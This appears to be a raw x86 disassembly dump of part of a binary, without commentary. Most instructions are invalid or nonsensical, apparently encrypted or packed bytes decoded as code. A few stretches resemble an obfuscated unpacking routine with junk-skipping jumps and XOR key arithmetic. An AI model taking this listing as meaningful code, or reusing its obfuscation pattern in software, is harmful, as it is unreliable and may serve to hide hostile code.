  40a6fa:	sbb    DWORD PTR [edi],edx
  40a6fc:	jno    0x40a68e
  40a6fe:	ftst   
  40a700:	test   eax,0x1bd6ce66
  40a705:	loopne 0x40a6c3
  40a707:	shr    DWORD PTR ds:0xe2315c04,1
  40a70d:	mov    ecx,DWORD PTR [esi]
  40a70f:	adc    ebx,eax
  40a711:	repnz and al,0x97
  40a714:	faddp  st(3),st
  40a716:	loope  0x40a736
  40a718:	adc    al,0xd
  40a71a:	inc    eax
  40a71b:	sbb    eax,0x7cf59acc
  40a720:	into   
  40a721:	es jnp 0x40a79c
  40a724:	and    edi,DWORD PTR [ebx+0x1370b042]
  40a72a:	(bad)  
  40a72b:	in     eax,dx
  40a72c:	nop
  40a72d:	test   DWORD PTR [edx-0x6df68164],eax
  40a733:	sti    
  40a734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a735:	repnz cmp cl,dl
  40a738:	clc    
  40a739:	cmp    eax,0xc255100a
  40a73e:	(bad)  
  40a73f:	push   ss
  40a740:	push   esi
  40a741:	xor    dl,dl
  40a743:	and    dh,cl
  40a745:	sbb    eax,0xa40402b3
  40a74a:	dec    ecx
  40a74b:	lock and BYTE PTR [ecx],dh
  40a74e:	loope  0x40a7bb
  40a750:	retf   
  40a751:	(bad)  
  40a752:	adc    al,0xf9
  40a754:	pop    eax
  40a755:	enter  0xfd3a,0x16
  40a759:	jbe    0x40a72e
  40a75b:	adc    al,0x6f
  40a75d:	jp     0x40a71d
  40a75f:	fcmovnbe st,st(4)
  40a761:	cmp    BYTE PTR [edi+0x3d],ch
  40a764:	jne    0x40a7c8
  40a766:	dec    edi
  40a767:	test   ch,0xf9
  40a76a:	dec    esi
  40a76b:	mov    bh,0xca
  40a76d:	inc    edx
  40a76e:	js     0x40a754
  40a770:	out    0x51,al
  40a772:	fwait
  40a773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a774:	loope  0x40a7a0
  40a776:	add    al,0x97
  40a778:	cld    
  40a779:	repz mov ds:0xbe6e5361,al
  40a77f:	das    
  40a780:	xchg   esp,eax
  40a781:	into   
  40a782:	sbb    ebx,ebp
  40a784:	clc    
  40a785:	push   0x35ca3bae
  40a78a:	xor    eax,0x600e147f
  40a78f:	mov    eax,0x61fbd70f
  40a794:	icebp  
  40a795:	dec    esi
  40a796:	rol    dh,cl
  40a798:	cli    
  40a799:	icebp  
  40a79a:	mov    ecx,0x9876912a
  40a79f:	jmp    0x40a7f7
  40a7a1:	inc    edi
  40a7a2:	add    eax,0x32729d
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43059e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43059e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43059e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43059e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43059e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ecd0
  40a7f1:	cmp    DWORD PTR ds:0x43059e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43059e
  40a803:	inc    eax
  40a804:	mov    ds:0x43059e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4305d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4305d6
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a838
  40a840:	ins    BYTE PTR es:[edi],dx
  40a841:	push   ebp
  40a842:	(bad)  
  40a843:	adc    eax,0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a88b
  40a84c:	sbb    al,0x97
  40a84e:	rcl    BYTE PTR [edi+0x58c3cea9],cl
  40a854:	stos   BYTE PTR es:[edi],al
  40a855:	popa   
  40a856:	call   0xe032:0x7a2d3b49
  40a85d:	retf   0xaeb6
  40a860:	cmp    BYTE PTR [edx+0x119778a],dl
  40a866:	call   FWORD PTR [edx+0x78]
  40a869:	sub    esp,DWORD PTR [bx]
  40a86c:	sbb    ch,bl
  40a86e:	push   ecx
  40a86f:	adc    dh,dh
  40a871:	daa    
  40a872:	push   ebp
  40a873:	jae    0x40a830
  40a875:	jno    0x40a809
  40a877:	inc    edx
  40a878:	pop    edi
  40a879:	inc    ebx
  40a87a:	inc    ebp
  40a87b:	xor    cl,dh
  40a87d:	push   edx
  40a87e:	push   ecx
  40a87f:	pop    edx
  40a880:	hlt    
  40a881:	out    0x7b,eax
  40a883:	(bad)  
  40a884:	iret   
  40a885:	push   edi
  40a886:	test   DWORD PTR [edi+ebp*8+0x5],esp
  40a88a:	jns    0x40a851
  40a88c:	pushf  
  40a88d:	outs   dx,BYTE PTR ds:[esi]
  40a88e:	and    DWORD PTR [eax-0x30],ecx
  40a891:	sbb    edx,DWORD PTR [edx]
  40a893:	mov    BYTE PTR [esi],dl
  40a895:	shl    BYTE PTR [edx],cl
  40a897:	push   cs
  40a898:	dec    ebx
  40a899:	cs mov eax,0xe19ae532
  40a89f:	sub    bl,ah
  40a8a1:	mov    dl,0x77
  40a8a3:	push   ebx
  40a8a4:	(bad)  
  40a8a5:	in     al,0xb3
  40a8a7:	pop    ecx
  40a8a8:	out    dx,al
  40a8a9:	add    al,0x99
  40a8ab:	out    0x1a,al
  40a8ad:	jg     0x40a91e
  40a8af:	push   edx
  40a8b0:	or     eax,0xd9bcb464
  40a8b5:	xor    cl,BYTE PTR [edx]
  40a8b7:	jl     0x40a8c7
  40a8b9:	popf   
  40a8ba:	icebp  
  40a8bb:	ficomp WORD PTR [eiz*4-0x6b29b46d]
  40a8c2:	das    
  40a8c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8c4:	pop    edx
  40a8c5:	mov    edx,0xf9003d39
  40a8ca:	dec    eax
  40a8cb:	adc    al,0x2d
  40a8cd:	cmc    
  40a8ce:	jge    0x40a8fe
  40a8d0:	ja     0x40a899
  40a8d2:	iret   
  40a8d3:	push   esp
  40a8d4:	cmp    BYTE PTR [ebx-0x3f802644],bl
  40a8da:	das    
  40a8db:	cmp    al,0x11
  40a8dd:	dec    ebx
  40a8de:	sbb    BYTE PTR [ebx-0x6f],dl
  40a8e1:	adc    esi,DWORD PTR [ecx]
  40a8e3:	into   
  40a8e4:	repz cli 
  40a8e6:	mov    bh,0xed
  40a8e8:	outs   dx,BYTE PTR ds:[esi]
  40a8e9:	lea    ebx,[ebx+0x1d6fdc97]
  40a8ef:	or     DWORD PTR [ebp+0x11355f1a],0xffffffe6
  40a8f6:	jg     0x40a8e0
  40a8f8:	mov    DWORD PTR [ebx+edi*4-0x4c],ebx
  40a8fc:	xchg   esi,eax
  40a8fd:	add    bl,BYTE PTR [edx+0x7]
  40a900:	jl     0x40a8f6
  40a902:	jae    0x40a983
  40a904:	or     cl,0x99
  40a907:	push   0x626975b8
  40a90c:	xlat   BYTE PTR ds:[ebx]
  40a90d:	dec    ecx
  40a90e:	adc    eax,0xde0fe243
  40a913:	jo     0x40a954
  40a915:	push   esp
  40a916:	push   ss
  40a917:	dec    ecx
  40a918:	ficomp WORD PTR [edi]
  40a91a:	pop    esp
  40a91b:	mov    ecx,0xbc2c1961
  40a920:	inc    ecx
  40a921:	pop    es
  40a922:	shl    bl,0x9a
  40a925:	adc    bl,cl
  40a927:	(bad)  
  40a928:	lea    eax,[ecx]
  40a92a:	add    ecx,ebx
  40a92c:	pop    eax
  40a92d:	mov    ch,BYTE PTR [edi]
  40a92f:	mov    ah,0xd9
  40a931:	inc    eax
  40a932:	fmul   DWORD PTR [ebx+0x48]
  40a935:	sub    dh,BYTE PTR [edx+0x35796dfc]
  40a93b:	push   edx
  40a93c:	in     al,dx
  40a93d:	loopne 0x40a958
  40a93f:	adc    DWORD PTR [ecx],0xffffffeb
  40a942:	mov    cs,edi
  40a944:	imul   BYTE PTR [ecx]
  40a946:	aam    0x8
  40a948:	mov    ecx,0x619fbee9
  40a94d:	cmp    DWORD PTR [ebx+0x20e6d959],edx
  40a953:	xchg   edi,eax
  40a954:	pop    edx
  40a955:	push   ecx
  40a956:	add    eax,0x2e4b7d72
  40a95b:	pop    eax
  40a95c:	mov    dh,0x41
  40a95e:	add    eax,0x5e5f1c2a
  40a963:	pop    ss
  40a964:	(bad)  
  40a965:	jmp    0x87e29836
  40a96a:	pop    ecx
  40a96b:	ret    0x370f
  40a96e:	(bad)  [ebp+ebp*2-0x30]
  40a972:	cmp    edi,DWORD PTR [edx]
  40a974:	aam    0xcd
  40a976:	scas   eax,DWORD PTR es:[edi]
  40a977:	mov    ss,WORD PTR [edx+0x4640a345]
  40a97d:	aam    0xc6
  40a97f:	mov    al,0xb2
  40a981:	xlat   BYTE PTR ds:[ebx]
  40a982:	cmp    dl,BYTE PTR [eax-0x75337c65]
  40a988:	aas    
  40a989:	mov    al,ds:0x25e77bfd
  40a98e:	cmp    DWORD PTR [ecx-0x26],0xffffffef
  40a992:	cld    
  40a993:	iret   
  40a994:	lds    edi,FWORD PTR [ecx+0x6b4299e0]
  40a99a:	and    bh,BYTE PTR [ebx]
  40a99c:	sbb    al,0x54
  40a99e:	xor    DWORD PTR [edx+ecx*8+0x2],ebp
  40a9a2:	add    dl,BYTE PTR [ebx+0x49]
  40a9a5:	xchg   edi,eax
  40a9a6:	(bad)  
  40a9a7:	retf   0xb771
  40a9aa:	mov    ecx,0xdaa142a0
  40a9af:	daa    
  40a9b0:	cld    
  40a9b1:	mov    WORD PTR [ebp+0x6f],fs
  40a9b4:	in     al,dx
  40a9b5:	out    dx,eax
  40a9b6:	pop    esi
  40a9b7:	dec    edx
  40a9b8:	push   0xa
  40a9ba:	jns    0x40a946
  40a9bc:	(bad)  
  40a9bd:	in     eax,0x82
  40a9bf:	pop    eax
  40a9c0:	push   es
  40a9c1:	pop    esp
  40a9c2:	dec    edi
  40a9c3:	fcomp  st(3)
  40a9c5:	clc    
  40a9c6:	mov    ebx,ebp
  40a9c8:	icebp  
  40a9c9:	push   cs
  40a9ca:	adc    eax,0x7b171c28
  40a9cf:	dec    ebp
  40a9d0:	ins    BYTE PTR es:[edi],dx
  40a9d1:	adc    eax,0x98580b33
  40a9d6:	xlat   BYTE PTR ds:[ebx]
  40a9d7:	out    0xd8,al
  40a9d9:	pop    es
  40a9da:	call   0x7360:0x19f8ccaa
  40a9e1:	test   al,0x10
  40a9e3:	arpl   WORD PTR [edx+0x78],ax
  40a9e6:	ins    BYTE PTR es:[edi],dx
  40a9e7:	dec    ebp
  40a9e8:	rcl    DWORD PTR [edx+0x4cc6eeb0],1
  40a9ee:	fdivrp st(4),st
  40a9f0:	sbb    DWORD PTR [eax-0x76b44f7],edx
  40a9f6:	jb     0x40aa70
  40a9f8:	lods   al,BYTE PTR ds:[esi]
  40a9f9:	hlt    
  40a9fa:	retf   
  40a9fb:	jmpw   0x9611
  40a9ff:	push   edx
  40aa00:	pop    esp
  40aa01:	mov    al,0x5a
  40aa03:	nop
  40aa04:	shl    BYTE PTR [ebx-0x12],1
  40aa07:	lea    edi,ds:0xead64598
  40aa0d:	aad    0x2f
  40aa0f:	pop    ecx
  40aa10:	ds retf 
  40aa12:	sbb    cl,cl
  40aa14:	push   eax
  40aa15:	push   ebp
  40aa16:	xor    eax,0x6ca35c88
  40aa1b:	dec    esp
  40aa1c:	inc    eax
  40aa1d:	loope  0x40aa3a
  40aa1f:	sbb    edi,esi
  40aa21:	rcr    cl,1
  40aa23:	push   ds
  40aa24:	rcl    DWORD PTR [edi],1
  40aa26:	xor    edi,DWORD PTR [edx]
  40aa28:	add    eax,0x32fc45c7
  40aa2d:	test   DWORD PTR [eax+edi*8+0x458bd10b],ebx
  40aa34:	cld    
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e862,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43065a,0x42e862
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e85a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430656,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	mov    esi,0x73b2b87e
  40aaa2:	in     eax,dx
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40ab26
  40aaaa:	aaa    
  40aaab:	push   ds
  40aaac:	fidiv  DWORD PTR [esi+0x56a8bcb9]
  40aab2:	ret    0xfff4
  40aab5:	mov    ebx,0x3e24b7fe
  40aaba:	data16 mov cs,WORD PTR [esi-0x3e]
  40aabe:	xchg   esp,edi
  40aac0:	push   0x4364bf32
  40aac5:	inc    eax
  40aac6:	jg     0x40aae6
  40aac8:	or     dl,BYTE PTR [esi-0x22]
  40aacb:	fst    DWORD PTR [ecx]
  40aacd:	fs sti 
  40aacf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aad0:	or     eax,0xddd24afa
  40aad5:	cs inc edx
  40aad7:	iret   
  40aad8:	sbb    al,0x37
  40aada:	dec    ecx
  40aadb:	cld    
  40aadc:	jo     0x40aac3
  40aade:	loop   0x40aad7
  40aae0:	mov    ds:0x1a4c003,eax
  40aae5:	fnstenv [esi+0x3b]
  40aae8:	ret    
  40aae9:	(bad)  
  40aaeb:	adc    eax,DWORD PTR [edi+0x627925dc]
  40aaf1:	add    al,0xc4
  40aaf3:	add    ebx,DWORD PTR [ecx]
  40aaf5:	mov    al,ds:0xbdb7824b
  40aafa:	dec    ecx
  40aafb:	pop    edi
  40aafc:	fwait
  40aafd:	rcl    cl,1
  40aaff:	and    cl,BYTE PTR [esi]
  40ab01:	or     edx,eax
  40ab03:	and    ecx,ebp
  40ab05:	or     DWORD PTR [ecx],eax
  40ab07:	nop
  40ab08:	jmp    0xc1dc:0x7e3ee1f6
  40ab0f:	xchg   ecx,eax
  40ab10:	push   esi
  40ab11:	add    esp,DWORD PTR [edi+0x28917d88]
  40ab17:	inc    ecx
  40ab18:	inc    ecx
  40ab19:	inc    eax
  40ab1a:	clc    
  40ab1b:	mov    ebx,0x89451a8f
  40ab20:	mov    ds:0x5c207dd7,al
  40ab25:	lods   eax,DWORD PTR ds:[esi]
  40ab26:	mov    DWORD PTR [eax-0x6d5f0565],edi
  40ab2c:	addr16 popa 
  40ab2e:	js     0x40aab5
  40ab30:	cmc    
  40ab31:	(bad)  
  40ab32:	push   eax
  40ab33:	arpl   WORD PTR [edx],sp
  40ab35:	xchg   ebp,eax
  40ab36:	sub    BYTE PTR [eax],bh
  40ab38:	cli    
  40ab39:	clc    
  40ab3a:	mov    bl,0x39
  40ab3c:	hlt    
  40ab3d:	jb     0x40aba8
  40ab3f:	fwait
  40ab40:	in     eax,dx
  40ab41:	adc    eax,0xb92fb95
  40ab46:	inc    esi
  40ab47:	or     DWORD PTR [ecx-0x52],0x62
  40ab4b:	(bad)  
  40ab4c:	sub    ch,BYTE PTR [edx+esi*4+0x34]
  40ab50:	stos   BYTE PTR es:[edi],al
  40ab51:	sbb    BYTE PTR [edx+eiz*4+0x3a],cl
  40ab55:	xor    al,ch
  40ab57:	ja     0x40ab66
  40ab59:	jae    0x40ab5e
  40ab5b:	hlt    
  40ab5c:	mov    bh,0x96
  40ab5e:	(bad)  
  40ab5f:	test   BYTE PTR [eax],bl
  40ab61:	int    0x40
  40ab63:	sub    ebp,DWORD PTR [ebx]
  40ab65:	sbb    BYTE PTR [ecx-0x6721b758],dl
  40ab6b:	push   esi
  40ab6c:	jbe    0x40ab14
  40ab6e:	add    eax,DWORD PTR [ebx*1-0x4357ce48]
  40ab75:	call   0x904b:0x6c73e355
  40ab7c:	repz les edi,FWORD PTR [ebp-0x12]
  40ab80:	push   ecx
  40ab81:	sbb    BYTE PTR [edi+0x545584a4],al
  40ab87:	ds jbe 0x40abe8
  40ab8a:	push   esp
  40ab8b:	mov    eax,0x3a7c903f
  40ab90:	pop    es
  40ab91:	add    al,0x3c
  40ab93:	es test ecx,0x1353c2dc
  40ab9a:	int3   
  40ab9b:	xor    dl,dl
  40ab9d:	pop    ebx
  40ab9e:	out    dx,al
  40ab9f:	lahf   
  40aba0:	cld    
  40aba1:	lods   al,BYTE PTR ds:[esi]
  40aba2:	icebp  
  40aba3:	adc    ah,bl
  40aba5:	add    DWORD PTR [edx+edx*4-0xb19a3e0],0x58233adb
  40abb0:	popf   
  40abb1:	pop    esp
  40abb2:	sbb    ebp,DWORD PTR [ebp-0x6f]
  40abb5:	push   edx
  40abb6:	out    dx,eax
  40abb7:	in     eax,dx
  40abb8:	xor    ch,BYTE PTR [edi-0x40c42581]
  40abbe:	ss cld 
  40abc0:	add    edx,DWORD PTR [esi+0x5a2d2b93]
  40abc6:	push   ebp
  40abc7:	shr    BYTE PTR [edx-0x2d],cl
  40abca:	fcomp  DWORD PTR [esi]
  40abcc:	inc    edi
  40abcd:	out    dx,al
  40abce:	bound  ebx,QWORD PTR [ebp+0x1b]
  40abd1:	inc    BYTE PTR [edi+0x532a708b]
  40abd7:	stos   DWORD PTR es:[edi],eax
  40abd8:	mov    dx,0xc73
  40abdc:	mov    ebx,DWORD PTR [edi]
  40abde:	sti    
  40abdf:	test   eax,0xe78411a9
  40abe4:	mov    edi,0xdb382562
  40abe9:	test   DWORD PTR [ebp+ecx*2-0x7e],eax
  40abed:	rcr    dl,cl
  40abef:	inc    esp
  40abf0:	or     al,BYTE PTR [ebx+ecx*4+0x52378ceb]
  40abf7:	mov    edx,0xda9b3c5e
  40abfc:	push   ds
  40abfd:	push   0xffffff88
  40abff:	adc    esi,DWORD PTR [ebx]
  40ac01:	lods   eax,DWORD PTR ds:[esi]
  40ac02:	fstp   st(6)
  40ac04:	cmp    dl,cl
  40ac06:	je     0x40ac50
  40ac08:	mov    ?,WORD PTR [ebp-0x77ce34fc]
  40ac0e:	div    WORD PTR [eax-0x1cedb6b8]
  40ac15:	jp     0x40abb4
  40ac17:	je     0x40abe3
  40ac19:	in     eax,0x3
  40ac1b:	fisttp DWORD PTR [edi]
  40ac1d:	test   BYTE PTR [edi-0x3ea29a85],dl
  40ac23:	or     dh,BYTE PTR [edi+0x50f8e196]
  40ac29:	dec    BYTE PTR [esi+0x2ff1ef59]
  40ac2f:	retf   0xe5f6
  40ac32:	mov    ch,0x96
  40ac34:	repz mov ebx,0x84d867cc
  40ac3a:	icebp  
  40ac3b:	outs   dx,DWORD PTR ds:[esi]
  40ac3c:	neg    BYTE PTR [edx+0x2d14ffdf]
  40ac42:	popf   
  40ac43:	call   0x5a9e8403
  40ac48:	pop    ss
  40ac49:	pop    ss
  40ac4a:	mov    esi,ss
  40ac4c:	sti    
  40ac4d:	and    edi,ebx
  40ac4f:	inc    esp
  40ac50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac51:	and    dl,BYTE PTR [ecx+0x62]
  40ac54:	in     eax,dx
  40ac55:	popf   
  40ac56:	cmp    al,0x7
  40ac58:	(bad)  
  40ac59:	mov    ds:0x1bcd919d,eax
  40ac5e:	in     eax,0x91
  40ac60:	cmp    BYTE PTR [eax-0x1e],0x98
  40ac64:	shr    BYTE PTR [esi+0x57],1
  40ac67:	add    al,0x35
  40ac69:	push   es
  40ac6a:	aad    0x60
  40ac6c:	jnp    0x40ac7e
  40ac6e:	aam    0xc9
  40ac70:	lds    eax,FWORD PTR [ebx+ebp*4]
  40ac73:	dec    edi
  40ac74:	mov    edi,0x5cdfaa42
  40ac79:	addr16 and al,0x84
  40ac7c:	add    BYTE PTR [ebp-0x2a],al
  40ac7f:	push   ss
  40ac80:	clc    
  40ac81:	ffreep st(3)
  40ac83:	xchg   esi,eax
  40ac84:	mov    bh,0xe2
  40ac86:	int3   
  40ac87:	xor    eax,edx
  40ac89:	xor    esi,edx
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0x3466ba02
  40aca1:	and    eax,0x7e7eee51
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ac75
  40acab:	in     eax,0xe4
  40acad:	ins    BYTE PTR es:[edi],dx
  40acae:	jne    0x40acb9
  40acb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acb1:	pop    es
  40acb2:	ins    BYTE PTR es:[edi],dx
  40acb3:	jge    0x40ac5a
  40acb5:	add    edi,DWORD PTR [eax-0x3e]
  40acb8:	loop   0x40ac80
  40acba:	jae    0x40ad16
  40acbc:	dec    edx
  40acbd:	call   0xa876:0x184bde24
  40acc4:	inc    ebp
  40acc5:	hlt    
  40acc6:	repz mov edi,0x1f8b30f9
  40accc:	inc    ebx
  40accd:	cmp    eax,0xa34591bc
  40acd2:	add    esi,DWORD PTR [ebx]
  40acd4:	sar    DWORD PTR [eax-0x1e],0x14
  40acd8:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40acda:	push   ecx
  40acdb:	stos   DWORD PTR es:[edi],eax
  40acdc:	sbb    esi,DWORD PTR [eax-0x19]
  40acdf:	xor    al,0xe
  40ace1:	pop    esp
  40ace2:	adc    ebx,esi
  40ace4:	popf   
  40ace5:	and    eax,0xe77f7e15
  40acea:	dec    ebp
  40aceb:	in     eax,0xe3
  40aced:	pop    ebx
  40acee:	sub    DWORD PTR [eax-0xe],ebp
  40acf1:	imul   edx,DWORD PTR [esi-0x74],0x1ca8a451
  40acf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acf9:	sbb    al,0xe1
  40acfb:	xchg   esp,eax
  40acfc:	cld    
  40acfd:	ret    
  40acfe:	out    dx,al
  40acff:	mov    esp,0xf0b11446
  40ad04:	push   edx
  40ad05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad06:	icebp  
  40ad07:	mov    ecx,0x94637ca6
  40ad0c:	or     BYTE PTR [ebx-0x5dca72ad],bh
  40ad12:	aad    0xb9
  40ad14:	jp     0x40acf3
  40ad16:	in     al,0x8
  40ad18:	xchg   esp,eax
  40ad19:	js     0x40acfc
  40ad1b:	mov    edi,0x2325d1ac
  40ad20:	xor    al,BYTE PTR [edi+0x33]
  40ad23:	and    eax,DWORD PTR [edx]
  40ad25:	cmp    edx,esp
  40ad27:	call   0x569ef758
  40ad2c:	shl    DWORD PTR [ebx+0x6744dfc8],0xd2
  40ad33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad34:	in     al,0x59
  40ad36:	lods   eax,DWORD PTR ds:[esi]
  40ad37:	mov    dl,0x69
  40ad39:	outs   dx,BYTE PTR ds:[esi]
  40ad3a:	pop    esp
  40ad3b:	inc    edx
  40ad3c:	retf   0x696d
  40ad3f:	mov    eax,DWORD PTR [edi]
  40ad41:	inc    edx
  40ad42:	jge    0x40ad60
  40ad44:	jg     0x40ad6f
  40ad46:	mov    dh,0x3b
  40ad48:	add    eax,edx
  40ad4a:	js     0x40acdf
  40ad4c:	mov    ebx,DWORD PTR ds:0x2801ca40
  40ad52:	jns    0x40ad72
  40ad54:	jp     0x40ad12
  40ad56:	inc    esi
  40ad57:	fld    TBYTE PTR [esi+ebx*1]
  40ad5a:	push   esi
  40ad5b:	out    dx,al
  40ad5c:	pusha  
  40ad5d:	inc    esi
  40ad5e:	dec    eax
  40ad5f:	jmp    0x40adcb
  40ad61:	pop    es
  40ad62:	push   edx
  40ad63:	mov    al,0xbf
  40ad65:	and    BYTE PTR [esi-0x188c259],bl
  40ad6b:	xor    al,0xa0
  40ad6d:	cmp    al,0x9f
  40ad6f:	std    
  40ad70:	pop    edi
  40ad71:	push   0x9b000f47
  40ad76:	sbb    al,0xfe
  40ad78:	shl    BYTE PTR [esi+0xb],1
  40ad7b:	fsubr  st,st(2)
  40ad7d:	test   DWORD PTR [edi],0xcac95878
  40ad83:	inc    DWORD PTR [bp+si+0x7bef]
  40ad88:	mov    edi,0xce9e3c23
  40ad8d:	push   ebp
  40ad8e:	adc    ax,0xc495
  40ad92:	dec    ebp
  40ad93:	xchg   edi,eax
  40ad94:	mov    cl,0x55
  40ad96:	xlat   BYTE PTR ds:[ebx]
  40ad97:	and    BYTE PTR [ebx],dh
  40ad99:	stos   DWORD PTR es:[edi],eax
  40ad9a:	je     0x40ad41
  40ad9c:	dec    esi
  40ad9d:	arpl   WORD PTR [ebx+edx*1-0x42142ffc],bp
  40ada4:	test   eax,0xedb18967
  40ada9:	fstp   DWORD PTR [ebx]
  40adab:	push   0x2e
  40adad:	add    eax,0x38aa152b
  40adb3:	es (bad) 
  40adb5:	lods   eax,DWORD PTR ds:[esi]
  40adb6:	cwde   
  40adb7:	push   edx
  40adb8:	lea    ebp,gs:[ebp+0x4f]
  40adbc:	lock int 0xed
  40adbf:	popf   
  40adc0:	push   es
  40adc1:	cmp    ah,BYTE PTR [esi-0x19]
  40adc4:	sbb    edx,edi
  40adc6:	and    BYTE PTR [eax-0x2f],dh
  40adc9:	enter  0x3889,0xa9
  40adcd:	(bad)  
  40adce:	pushf  
  40adcf:	push   edx
  40add0:	ins    BYTE PTR es:[edi],dx
  40add1:	cwde   
  40add2:	fstp   QWORD PTR [esp+ebp*4-0x38]
  40add6:	xlat   BYTE PTR ds:[ebx]
  40add7:	adc    BYTE PTR [eax+0x5c],cl
  40adda:	je     0x40ad79
  40addc:	pop    es
  40addd:	pop    ebx
  40adde:	cmp    ebp,DWORD PTR [edi]
  40ade0:	pop    eax
  40ade1:	mov    DWORD PTR [edx+0x4798d7b8],esi
  40ade7:	fld    st(1)
  40ade9:	xchg   esi,eax
  40adea:	arpl   WORD PTR [esi-0x48],ax
  40aded:	dec    ebx
  40adee:	sub    edx,DWORD PTR [eax-0x5a]
  40adf1:	arpl   WORD PTR [esi+0x24af9f9e],di
  40adf7:	pop    ds
  40adf8:	mov    ch,0x5f
  40adfa:	pop    edi
  40adfb:	imul   edx,DWORD PTR [edi],0x7f
  40adfe:	popf   
  40adff:	push   cs
  40ae00:	(bad)  
  40ae01:	pop    ebx
  40ae02:	test   al,0x68
  40ae04:	neg    BYTE PTR [ebx]
  40ae06:	retf   0x26cd
  40ae09:	ret    0x733e
  40ae0c:	xor    esi,DWORD PTR [esi+0x5]
  40ae0f:	dec    esi
  40ae10:	fwait
  40ae11:	bound  eax,QWORD PTR [ebx-0x18]
  40ae14:	push   esi
  40ae15:	adc    al,0x1b
  40ae17:	ret    0xbaa6
  40ae1a:	fidivr DWORD PTR [ecx]
  40ae1c:	rcl    BYTE PTR [ecx],0xee
  40ae1f:	call   0xc4de:0x7d712ad0
  40ae26:	cmp    al,0xf9
  40ae28:	jno    0x40adf6
  40ae2a:	pop    ecx
  40ae2b:	mov    edx,0xb0cca8bd
  40ae30:	test   BYTE PTR gs:[edx-0x1ab5fc4e],dh
  40ae37:	add    BYTE PTR [ecx],0x6a
  40ae3a:	adc    al,0xec
  40ae3c:	mov    cl,BYTE PTR [edi-0xf]
  40ae3f:	xchg   DWORD PTR [edi-0x77888768],ebp
  40ae45:	ret    0xdfa5
  40ae48:	mov    cl,0x28
  40ae4a:	aad    0xf5
  40ae4c:	call   0x39bd:0x8c1a810
  40ae53:	inc    ebx
  40ae54:	push   0x7c
  40ae56:	pushf  
  40ae57:	push   0x27c96727
  40ae5c:	dec    ebx
  40ae5d:	arpl   cx,si
  40ae5f:	repz popa 
  40ae61:	neg    DWORD PTR [edx-0x42]
  40ae64:	ret    0xdebf
  40ae67:	adc    bl,dl
  40ae69:	dec    ebx
  40ae6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae6b:	hlt    
  40ae6c:	adc    DWORD PTR [ecx-0x10],ebx
  40ae6f:	mov    bh,0xa3
  40ae71:	dec    esp
  40ae72:	adc    al,0xc6
  40ae74:	adc    BYTE PTR [edi+0x21],dl
  40ae77:	push   ds
  40ae78:	scas   al,BYTE PTR es:[edi]
  40ae79:	xchg   BYTE PTR [ecx-0x61df7c43],bl
  40ae7f:	(bad)  
  40ae80:	mov    eax,0xa71a2bcf
  40ae85:	out    dx,eax
  40ae86:	or     al,BYTE PTR [edx+0x3]
  40ae89:	icebp  
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
